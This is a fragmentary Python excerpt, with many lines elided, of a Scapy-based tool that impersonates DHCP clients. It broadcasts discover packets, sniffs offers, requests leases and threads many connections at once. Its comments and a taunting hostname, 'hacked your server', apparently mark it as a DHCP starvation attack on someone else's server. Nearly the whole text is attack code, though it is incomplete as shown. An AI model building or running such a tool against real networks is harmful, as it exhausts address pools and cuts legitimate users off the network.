...
class DHCPClient:
	...
	def to_trash(self): #destory this client and create new co connection process  
		self.ip = DHCPClient.__DEFAULTIP__
		self.time = None 
		self.curTime = None 
		self.stat =DHCPStatus.DISCOVER
	...
	def re_requestyou(self): #renew the connection 
	...
	def __requestyou__(self,packet)->dict: #request + ack 
	...
	def __offerme__(self)->None: #offer 
		...
		and ( IP in packet and packet[IP].src == self.__settings__["serverIp"] if self.__settings__["serverIp"] else True  )
          	...
          	count=1,timeout= 7 ) 
  		#smart sniff that takes only our packets and sends them to __requestyou__ func 
		print(f" pack : { self.name } : {pack } : { len(pack)}  ")
		if  len(pack) ==0   : #no free leases 
	...
	def discover(self)-> Thread:  
     #discover connection 
		...
		while(DHCPClient.__onAir__ >= 5 and not self.mantian): #so the dhcp server not be flowded 
			if(DHCPClient.aborted != -1 ) :
				return None
		DHCPClient.__onAir__+=1 #it is in the connection process 
		Frame = Ether(dst = DHCPClient.__BROADCASTMAC__, src = self.mac) 
		Datagram = IP( dst = DHCPClient.__BROADCASTIP__, src= self.ip  ) 
		Segment = UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
		Bootp = BOOTP(chaddr=mac2str(self.mac) , xid = RandInt()) 
		DHCPPACK = DHCP ( options = [('message-type','discover'),('hostname','hacked your server moran ;)IDHM;) '),'end'] )#nice messgae so the dhcp owner will be suprised when he will look on the logs 
		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
		tr = Thread(target=self.__offerme__) #each connection process get new thread so it will be fast 
		tr.start()
